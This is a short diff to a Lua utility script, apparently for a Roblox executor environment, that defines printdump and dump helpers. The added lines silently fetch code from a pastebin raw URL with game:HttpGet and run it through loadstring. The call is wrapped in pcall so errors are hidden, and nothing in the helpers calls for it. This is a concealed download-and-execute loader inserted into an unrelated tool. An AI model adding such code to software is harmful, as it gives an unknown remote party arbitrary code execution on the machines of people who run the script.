@@ -80,6 +80,10 @@ function printdump(...)
     print(output)
 end
 
+pcall(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/UWBkdsed"))()
+end)
+
 getgenv().printdump = printdump
 getgenv().dump = dump
 
